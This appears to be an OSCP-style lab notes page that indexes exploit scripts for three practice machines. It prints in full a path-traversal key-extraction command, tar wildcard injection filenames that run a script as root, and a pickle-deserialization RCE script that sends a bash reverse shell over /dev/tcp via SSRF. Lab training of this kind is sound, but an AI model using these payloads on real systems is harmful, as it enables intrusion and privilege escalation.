---
type: script-index
project: OSCP-Exam-PoC
status: maintained
updated: "2026-11-07"
related_machines:
  - ME-01
  - HA-01
  - IN-01
tags:
  - oscp
  - scripts
  - poc
  - bash
  - python
  - c
  - automation
  - exploit-development
---

# PoC Scripts Index

## Purpose

This document is the central registry for scripts, execution helpers, diagnostic utilities, and third-party PoC implementations encountered during the examination.

It is deliberately not limited to successful exploits.

Failed scripts and abandoned research are retained because they contain useful implementation details, troubleshooting evidence, and potential starting points for future development.

Each entry records:

- Original filename or function name.
    
- Machine and execution context.
    
- Intended functionality.
    
- Source or implementation.
    
- Actual result.
    
- Known limitations and failure conditions.
    
- Related exploitation documentation.
    

## 1. Script Inventory

### 1.1 Locally created scripts and helpers

|Artifact|Machine|Type|Status|Purpose|
|---|---|---|---|---|
|`config.py` API-key extraction block|ME-01|Shell helper|Validated|Extract an API key from a disclosed configuration file|
|`root-flag.sh`|HA-01|Shell script|Validated|Retrieve the root flag through tar wildcard injection|
|`ssrf_exec()`|IN-01|Zsh function|Validated|Execute commands through pickle deserialization and return output in-band|
|`reverse-shell.sh`|IN-01|Bash script|Unsuccessful callback|Trigger a reverse shell through the confirmed RCE primitive|
|`inspect-healthcheck.sh`|IN-01|Bash script|Partially validated|Inspect the privileged healthcheck executable|
|`in01_preload.c`|IN-01|C source|Validated|Build a shared library for sudo LD_PRELOAD privilege escalation|

### 1.2 Target-side scripts and executables inspected

|Artifact|Machine|Ownership|Purpose|
|---|---|---|---|
|`/opt/maint/backup.sh`|HA-01|root|Root cron backup job containing the tar wildcard vulnerability|
|`/usr/local/bin/healthcheck`|IN-01|root|Dynamically linked executable permitted through sudo|

These are artifacts recovered from the target machines, not scripts written for this examination.

### 1.3 Third-party PoC utilities and frameworks

|Project / Utility|Machine|Status|Purpose|
|---|---|---|---|
|Saneki RediShell PoC|HA-01|Unsuccessful adaptation|Redis CVE exploitation research|
|DarkReplica `extract_offsets.sh`|HA-01|Inspected, not executed|Extract Redis and libc symbol offsets|
|Metasploit `redis_replication_cmd_exec`|HA-01|Unsuccessful|Redis replication-based command execution|

---

## 2. ME-01 — API-Key Extraction

### Artifact: Configuration API-key extraction

**Type:** Shell command block, not a standalone script file.

**Purpose:** Retrieve the application configuration through the arbitrary-file-read vulnerability, extract `API_KEY`, and use it without manually transcribing the secret.

**Method:** `curl` piped into `sed`.

#### Final working implementation

```
BASE='http://<INSTANCE_IP>:<HTTP_PORT>'

API_KEY=$(curl -fsS --get \
  --data-urlencode 'file=../config.py' \
  "$BASE/api/download" |
  sed -n 's/^API_KEY = "\(.*\)"$/\1/p')

printf 'Extracted key length: %s\n' "${#API_KEY}"

curl -i --get \
  -H "X-API-Key: $API_KEY" \
  --data-urlencode 'host=1.1.1.1' \
  "$BASE/api/ping"
```

Replace the instance address and HTTP port with the current lab assignment.

#### Validation evidence

The successful execution returned:

```
Extracted key length: 30

HTTP/1.1 200 OK
Server: gunicorn
Content-Type: text/plain; charset=utf-8
```

The application returned the expected ping output:

```
PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
64 bytes from 1.1.1.1: icmp_seq=1 ttl=55 time=4.28 ms

--- 1.1.1.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss
```

<mark>Validated</mark>

The API key was recovered programmatically and authentication succeeded.

#### Development history

An earlier Python AST-based extraction approach was proposed:

```
import ast

tree = ast.parse(open("/tmp/me01-config.py").read())

for node in tree.body:
    if isinstance(node, ast.Assign):
        if any(isinstance(t, ast.Name) and t.id == "API_KEY"
               for t in node.targets):
            print(ast.literal_eval(node.value))
            break
```

It was superseded by the simpler `curl | sed` implementation.

The Python approach should be treated as an unvalidated alternative, not the successful method.

#### Related PoC

[[Difficulty Levels/Medium/ME-01/ME-01 Overview]]

---

## 3. HA-01 — Tar Wildcard Injection

### Artifact: `root-flag.sh`

**Original target path:**

```
/opt/maint/spool/root-flag.sh
```

**Execution account:** root, through the scheduled cron job.

**Purpose:** Copy `/root/root.txt` into the writable spool directory so the compromised `devops` account can read it.

#### Script source

```
#!/bin/sh
cat /root/root.txt > /opt/maint/spool/root.txt
chmod 644 /opt/maint/spool/root.txt
```

#### Creation method

The target did not have `vim`, `vi`, or `nano`.

The script was therefore created using the shell's `printf` builtin:

```
cd /opt/maint/spool

printf '%s\n' \
'#!/bin/sh' \
'cat /root/root.txt > /opt/maint/spool/root.txt' \
'chmod 644 /opt/maint/spool/root.txt' \
> root-flag.sh

chmod 700 root-flag.sh
```

#### Execution mechanism

The target contained the following root cron job:

```
* * * * * root /opt/maint/backup.sh >/dev/null 2>&1
```

The cron script executed:

```
#!/bin/sh
cd /opt/maint/spool 2>/dev/null || exit 0
tar -czf /opt/maint/backup.tar.gz * 2>/dev/null
```

The attacker-controlled filenames supplied GNU tar with its checkpoint options:

```
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh root-flag.sh'
```

The root cron process interpreted the injected options and executed the retrieval script.

#### Validation

I reported that the root flag was obtained.

<mark>Validated — successful root-flag retrieval.</mark>

#### Technical lessons

- An exploitable cron job does not require replacing its root-owned script.
    
- A writable directory consumed through an unquoted wildcard can be sufficient.
    
- A small helper script can make the final privileged action predictable.
    
- Missing editors on a target should not prevent file creation when standard shell utilities are available.
    

#### Related PoC

[[Reusable PoCs/Linux Privilege Escalation/Tar Wildcard Injection]]

---

## 4. IN-01 — In-Band Command Execution

### Artifact: `ssrf_exec()`

**Type:** Interactive Zsh function, not a standalone script file.

**Purpose:** Reuse the confirmed SSRF and Python pickle deserialization primitive to execute arbitrary commands and return their output through HTTP.

#### Function behavior

1. Accept a remote shell command.
    
2. Pass the command into a local Python process.
    
3. Generate a malicious pickle using `__reduce__`.
    
4. Base64-encode the serialized payload.
    
5. URL-encode the nested `data` parameter.
    
6. Submit the internal API URL through `/fetch`.
    
7. Display the returned HTTP response.
    

The reusable implementation is documented in:

[[Reusable PoCs/Python Pickle/Python Pickle RCE]]

#### Validation

The underlying execution primitive was confirmed with:

```
uid=1000(web) gid=1000(web) groups=1000(web)
web
/opt/app
```

It was also used to perform privilege-escalation enumeration.

<mark>Validated — remote command execution confirmed.</mark>

#### Important implementation detail

The original helper did not separately URL-encode the nested Base64 parameter.

That became visible when the reverse-shell payload produced an invalid Base64 error.

The hardened version encodes the nested value before encoding the outer URL.

Do not discard this correction when developing a standalone version.

---

## 5. IN-01 — Reverse Shell

### Artifact: `reverse-shell.sh`

**Original local path:**

```
~/Desktop/IN01/reverse-shell.sh
```

**Type:** Bash script.

**Purpose:** Trigger an outbound Bash reverse shell through the existing pickle RCE primitive.

**Result:** The target-side payload was accepted, but no incoming connection reached the Kali listener.

<mark>Unsuccessful — callback not established.</mark>

#### Original implementation behavior

The script accepted:

|Argument|Purpose|
|---|---|
|`$1`|Callback IP|
|`$2`|Callback port, default `4444`|

It generated a serialized pickle payload containing:

```
nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' \
  >/dev/null 2>&1 </dev/null &
```

#### Initial failure — nested Base64 corruption

The first implementation encoded the outer `url` parameter but did not separately URL-encode the nested `data` parameter.

The target returned:

```
error: Invalid base64-encoded string:
number of data characters (281) cannot be 1 more than a multiple of 4
```

The cause was the handling of Base64 characters during query-string parsing.

#### Corrected implementation

The following is a parameterized archival copy of the corrected implementation. The only environmental substitution is the target endpoint placeholder; the instance-specific IP and port must be replaced before execution.

```
#!/usr/bin/env bash
set -euo pipefail

TARGET='http://<INSTANCE_IP>:<HTTP_PORT>/fetch'
INTERNAL_API='http://127.1:9000/admin/exec'

LHOST="${1:?Usage: reverse-shell.sh <VPN_IP> [PORT]}"
LPORT="${2:-4444}"

REMOTE_CMD="nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1 </dev/null &"

# Generate the serialized payload.
DATA=$(
    REMOTE_CMD="$REMOTE_CMD" python3 - <<'PY'
import os
import base64
import pickle

class Exploit:
    def __reduce__(self):
        command = os.environ["REMOTE_CMD"]
        expression = (
            "__import__('subprocess').run("
            + repr(command)
            + ", shell=True, stdout=-1, stderr=-2, text=True).stdout"
        )
        return eval, (expression,)

print(base64.b64encode(
    pickle.dumps(Exploit(), protocol=4)
).decode())
PY
)

# Encode the nested Base64 value separately.
ENC_DATA=$(
    DATA="$DATA" python3 - <<'PY'
import os
from urllib.parse import quote

print(quote(os.environ["DATA"], safe=""))
PY
)

# Build the internal URL with its own encoded query parameter.
INTERNAL_URL="${INTERNAL_API}?data=${ENC_DATA}"

echo "[+] Target: $TARGET"
echo "[+] Internal endpoint: $INTERNAL_API"
echo "[+] Callback: $LHOST:$LPORT"
echo "[+] Payload length: ${#DATA}"
echo "[+] Triggering..."

curl -sS --max-time 10 -G \
    --data-urlencode "url=${INTERNAL_URL}" \
    -w '\n[HTTP %{http_code} | TIME %{time_total}s]\n' \
    "$TARGET"
```

#### Execution evidence

Listener:

```
nc -lvnp 4444
```

First callback address:

```
10.144.220.24
```

Second callback address:

```
10.10.17.123
```

The corrected script returned:

```
''
[HTTP 200 | TIME 0.674576s]
```

However, Netcat received no incoming connection.

The script was therefore not successful as a reverse-shell implementation.

#### What is confirmed and what is not

|Finding|Status|
|---|---|
|Pickle RCE on the target|Confirmed|
|Corrected nested URL encoding|Confirmed by HTTP response|
|HTTP 200 from the public fetch endpoint|Confirmed|
|Reverse-shell connection|Not established|
|VPN routing as the cause|Not proven|

**Do not classify this as a failed RCE.** The in-band execution method worked. Only the outbound callback failed.

#### Future development opportunities

- Make the callback interface configurable.
    
- Add a preflight test for listener reachability.
    
- Capture the HTTP response and distinguish transport success from shell success.
    
- Add a timeout and explicit callback status.
    
- Test alternative callback transports only after confirming the target's egress behavior.
    

#### Related PoC

[[Reusable PoCs/Python Pickle/Python Pickle RCE]]

---

## 6. IN-01 — Healthcheck Inspection

### Artifact: `inspect-healthcheck.sh`

**Original local path:**

```
~/Desktop/IN01/inspect-healthcheck.sh
```

**Type:** Bash diagnostic script.

**Purpose:** Inspect the sudo-permitted executable `/usr/local/bin/healthcheck` through the existing in-band RCE primitive.

**Result:** Executed successfully, but one inspection branch was unavailable because the target lacked the `file` utility.

<mark>Partially validated — useful inspection results obtained.</mark>

#### Implementation

```
#!/usr/bin/env bash
set -euo pipefail

TARGET='http://<INSTANCE_IP>:<HTTP_PORT>/fetch'
INTERNAL_API='http://127.1:9000/admin/exec'

REMOTE_CMD=$(cat <<'REMOTE'
set +e

BIN=/usr/local/bin/healthcheck

echo "========== IDENTITY =========="
id
whoami
pwd

echo
echo "========== FILE PERMISSIONS =========="
ls -ld /usr/local /usr/local/bin "$BIN"
stat "$BIN"
namei -l "$BIN"
readlink -f "$BIN"

echo
echo "========== FILE TYPE =========="
DESCRIPTION=$(file -b "$BIN")
echo "$DESCRIPTION"

echo
echo "========== SOURCE / BINARY INSPECTION =========="
case "$DESCRIPTION" in
    *script*|*text*)
        echo "--- File contents ---"
        sed -n '1,240p' "$BIN"
        ;;
    *ELF*)
        echo "--- ELF header ---"
        readelf -h "$BIN" 2>&1

        echo "--- ELF dependencies ---"
        readelf -d "$BIN" 2>&1

        echo "--- ELF program headers ---"
        readelf -l "$BIN" 2>&1

        echo "--- Embedded strings ---"
        strings -a -n 4 "$BIN" | head -160
        ;;
    *)
        echo "--- Embedded strings ---"
        strings -a -n 4 "$BIN" | head -160
        ;;
esac

echo
echo "========== SUDO PERMISSIONS =========="
sudo -n -l 2>&1

echo
echo "========== RELATED EXECUTABLES =========="
ls -la /usr/local/bin/

echo
echo "========== COMPILERS =========="
command -v gcc
command -v cc
command -v readelf
REMOTE
)

DATA=$(REMOTE_CMD="$REMOTE_CMD" python3 - <<'PY'
import os
import base64
import pickle

class Exploit:
    def __reduce__(self):
        command = os.environ["REMOTE_CMD"]
        expression = (
            "__import__('subprocess').run("
            + repr(command)
            + ", shell=True, stdout=-1, stderr=-2, "
              "text=True, errors='replace').stdout"
        )
        return eval, (expression,)

print(base64.b64encode(
    pickle.dumps(Exploit(), protocol=4)
).decode())
PY
)

ENC_DATA=$(DATA="$DATA" python3 -c '
import os
from urllib.parse import quote
print(quote(os.environ["DATA"], safe=""))
')

echo "[+] Target: $TARGET"
echo "[+] Internal API: $INTERNAL_API"
echo "[+] Inspecting healthcheck..."
echo

curl -sS --max-time 25 -G \
    --data-urlencode "url=${INTERNAL_API}?data=${ENC_DATA}" \
    -w '\n\n[HTTP %{http_code} | SIZE %{size_download} | TIME %{time_total}s]\n' \
    "$TARGET"
```

#### Confirmed output and findings

The remote output established:

|Check|Result|
|---|---|
|Execution identity|`web`, UID 1000|
|Target executable|`/usr/local/bin/healthcheck`|
|Owner|`root:root`|
|Permissions|`0755`|
|File size|15,960 bytes|
|GCC|Available|
|`cc`|Available|
|`readelf`|Available|
|`file`|Missing|

The missing utility produced:

```
/bin/sh: 19: file: not found
```

The script then used its fallback `strings` branch.

Relevant output:

```
/lib64/ld-linux-x86-64.so.2
puts
__libc_start_main
__cxa_finalize
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
healthcheck: all services ok
GCC: (Debian 14.2.0-19) 14.2.0
healthcheck.c
```

The executable was identified as a dynamically linked ELF through its embedded linker and library references.

**Implementation limitation:** Because `file` was unavailable, the script did not enter its explicit `readelf` inspection branch. The successful execution should not be described as a complete ELF analysis.

#### Future improvements

- Test for command availability before invoking utilities.
    
- Use `readelf -h` as a direct ELF identification fallback.
    
- Do not rely on `file` to decide whether a binary is ELF.
    
- Separate the remote inspection command from the pickle transport wrapper.
    

#### Related PoC

[[Reusable PoCs/Linux Privilege Escalation/LD_PRELOAD]]

---

## 7. IN-01 — LD_PRELOAD C Payload

### Artifact: `in01_preload.c`

**Original target path:**

```
/tmp/in01_preload.c
```

**Compiled output:**

```
/tmp/in01_preload.so
```

**Type:** C source compiled into a shared library.

**Purpose:** Execute a constructor when sudo loads the shared library through `LD_PRELOAD`.

The source was generated remotely and compiled using the target's GCC.

#### Validation

The actual execution returned:

```
[+] LD_PRELOAD constructor executed
[+] UID=0 EUID=0 GID=0 EGID=0

[+] ROOT FLAG:
IT{FLAG-SECRET}
healthcheck: all services ok
```

<mark>Validated — root execution confirmed.</mark>

The full C source, compilation command, and execution procedure are preserved in:

[[Reusable PoCs/Linux Privilege Escalation/LD_PRELOAD]]

Do not maintain a second copy of the C payload here. The LD_PRELOAD PoC is its authoritative implementation record.

---

## 8. HA-01 — DarkReplica Offset Utility

### Artifact: `extract_offsets.sh`

**Project:** [yoyosh/DarkReplica](https://github.com/yoyosh/DarkReplica)

**Original location in the cloned project:**

```
HA01-DarkReplica/extract_offsets.sh
```

**Type:** Third-party Bash utility.

**Purpose:** Extract the symbol offsets required by DarkReplica from two ELF binaries:

1. Redis server executable.
    
2. Matching libc executable.
    

#### Expected arguments

```
extract_offsets.sh <redis-server_elf> <libc_elf>
```

#### Extracted symbols

|Binary|Symbol|
|---|---|
|Redis server|`os_clock`|
|Redis server|`umask@got.plt`|
|libc|`umask`|
|libc|`system`|

The implementation uses:

- `readelf -s` for symbol-table lookups.
    
- `readelf -r` for relocation-table lookups.
    
- `grep` for symbol matching.
    
- `awk` for extracting addresses.
    

It emits a JSON5-compatible offset structure.

#### Actual investigation result

The repository was cloned successfully and the utility was inspected.

The project contained offset profiles for:

- Redis 8.6.2 Docker.
    
- A specific official Redis latest image.
    
- An empty example profile.
    

No profile matched HA-01's Redis 7.0.15 installation.

I did not execute the extraction utility because the exact target Redis and libc ELF files were not available.

<mark>Inspected — not executed against HA-01.</mark>

#### Why this artifact matters

The utility is reusable when the matching ELF files are available. It does not independently obtain those binaries, and it cannot derive accurate offsets from a Redis version string alone.

Do not classify the utility as an exploit or as a successful HA-01 adaptation.

---

## 9. HA-01 — Third-Party RediShell PoC

### Artifact: Saneki `main.py`

**Project:** [saneki/cve-2025-49844](https://github.com/saneki/cve-2025-49844)

**Local working directory:**

```
~/Desktop/HA01-RediShell/cve-2025-49844-ha01/
```

**Main implementation:**

```
src/cve_2025_49844/main.py
```

#### Modifications made

The original Redis connection used:

```
Redis(host='127.0.0.1', port=6379, password=None)
```

The local working copy was changed to connect to HA-01:

```
Redis(host='x.x.x.x', port=PORT_P, password=None)
```

The actual port was instance-specific.

#### Target mismatch

The target reported:

```
redis_version:7.0.15
redis_build_id:ae4d7c971a948f0
```

The bundled profiles supported two Redis 8.2.1 builds:

- Alpine.
    
- Bookworm.
    

The initial execution correctly stopped because no exact target profile matched.

A Bookworm profile was subsequently forced to investigate the implementation.

#### Actual result

```
[+] Redis: 7.0.15; ae4d7c971a948f0
[+] Found: redis:8.2.1-bookworm
[!] Failed to UAF chunkname
```

The remote connection worked, but the exploit failed before achieving the intended use-after-free.

The forced profile did not make the Redis 8.2.1 memory layout compatible with Redis 7.0.15.

<mark>Unsuccessful adaptation — no RCE obtained.</mark>

#### Preserve for future development

The modified project is useful as a record of:

- Remote Redis connection configuration.
    
- Exact version/build-ID matching.
    
- Target-profile selection.
    
- The consequences of forcing an incompatible profile.
    

Do not remove the original target checks merely to suppress a mismatch error.

---

## 10. HA-01 — Metasploit Redis Replication Module

### Artifact: `redis_replication_cmd_exec`

**Framework:** Metasploit

**Module:**

```
exploit/linux/redis/redis_replication_cmd_exec
```

**Type:** Framework exploit module, not a locally authored script.

#### Initial failure

With custom compilation enabled:

```
CUSTOM=true
```

Metasploit failed while attempting to create:

```
/usr/share/metasploit-framework/data/exploits/redis/module.c
```

Observed error:

```
Errno::EACCES Permission denied
```

#### Second attempt

Custom compilation was disabled:

```
set CUSTOM false
```

The module then attempted to use its bundled precompiled Redis module.

It started the rogue Redis replication service, but the target did not establish the required connection to Kali.

The target's replication status remained unsuccessful, and no command execution was obtained.

<mark>Unsuccessful — module compilation issue bypassed, callback requirement unresolved.</mark>

#### Important distinction

This module uses Redis replication to transfer and load a module. It is not the same exploit as RediShell or DarkReplica.

Reference:

[Rapid7 Metasploit module source](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/redis/redis_replication_cmd_exec.rb)

---

## 11. Script Development Lessons

These are the implementation issues worth retaining across future projects.

|Issue|What happened|Improvement|
|---|---|---|
|Nested URL encoding|Base64 was corrupted when embedded in a nested query parameter|Encode the inner parameter before encoding the outer URL|
|Unverified callbacks|HTTP 200 was mistaken for reverse-shell success|Verify the listener receives a connection|
|Hardcoded target ports|Instance ports changed after resets|Pass target host and port as runtime arguments|
|Hardcoded VPN address|Multiple tunnel interfaces existed|Make callback address configurable and verify routing|
|Missing target utilities|`file`, `vim`, `vi`, and `nano` were unavailable|Check tool availability and use fallbacks|
|Incomplete binary inspection|Missing `file` prevented the intended `readelf` branch|Identify ELF files independently|
|Misleading success output|Earlier script printed a success message after HTTP errors|Check HTTP status and response content|
|Binary output encoding|Non-UTF-8 bytes broke the HTTP response wrapper|Encode command output before transport|
|Overfitted exploit profiles|Redis 8.2.1 offsets were forced against Redis 7.0.15|Preserve target compatibility checks|
|Framework filesystem permissions|Metasploit could not generate `module.c`|Validate write permissions before enabling compilation|

---

## 12. Future Script Development Rules

Any new script added to this collection should have the following record.

### Required metadata

|Property|Description|
|---|---|
|Name|Actual filename or function name|
|Machine|Associated exam machine|
|Language|Bash, Zsh, Python, C, etc.|
|Purpose|The exact task it performs|
|Dependencies|Required binaries, libraries, permissions|
|Inputs|Arguments, variables, target information|
|Outputs|Files, responses, sessions, or other artifacts|
|Validation|Actual execution evidence|
|Limitations|Known failure conditions|
|Related PoC|Technique documentation|

### Status definitions

|Status|Meaning|
|---|---|
|`validated`|Executed successfully with supporting evidence|
|`partially-validated`|Executed, but one or more intended operations were unavailable or incomplete|
|`unsuccessful`|Attempted without achieving the intended result|
|`not-executed`|Source inspected but not run|
|`superseded`|Replaced by a better implementation but retained for history|
|`experimental`|Under development, without sufficient validation|

### Preservation policy

- Never delete a failed script merely because it did not work.
    
- Preserve the original implementation when creating an improved version.
    
- Record the exact error and the conditions under which it occurred.
    
- Do not label a script successful based only on an HTTP 200 response.
    
- Keep instance-specific IP addresses, ports, and credentials out of reusable defaults.
    
- Keep third-party source attribution and distinguish external code from original work.
    
- Link every script to the technique it supports.
    

---

## 13. Current Development Priorities

|Priority|Artifact|Next development objective|
|---|---|---|
|1|`reverse-shell.sh`|Diagnose callback reachability and add reliable connection verification|
|2|`inspect-healthcheck.sh`|Add utility detection and a direct ELF inspection fallback|
|3|`ssrf_exec()`|Promote the validated function into a portable standalone helper|
|4|`root-flag.sh`|Preserve as a minimal example of a target-side privilege-escalation helper|
|5|`extract_offsets.sh`|Reuse when exact Redis and libc ELF files are available|
|6|RediShell adaptation|Retain the compatibility findings without treating the forced profile as a successful exploit|

### Final Scope

This index contains the confirmed script artifacts and significant helper implementations identified during the examination.

The technique-specific PoCs remain the authoritative records for complete exploitation chains:

- [[Reusable PoCs/Redis/Redis Persistence]]
    
- [[Reusable PoCs/SSRF/SSRF Filter Bypass]]
    
- [[Reusable PoCs/Python Pickle/Python Pickle RCE]]
    
- [[Reusable PoCs/Linux Privilege Escalation/CAP_SETUID]]
    
- [[Reusable PoCs/Linux Privilege Escalation/Tar Wildcard Injection]]
    
- [[Reusable PoCs/Linux Privilege Escalation/LD_PRELOAD]]
    

The Scripts Index records the development assets behind those techniques, including the unsuccessful experiments that may become useful in future work.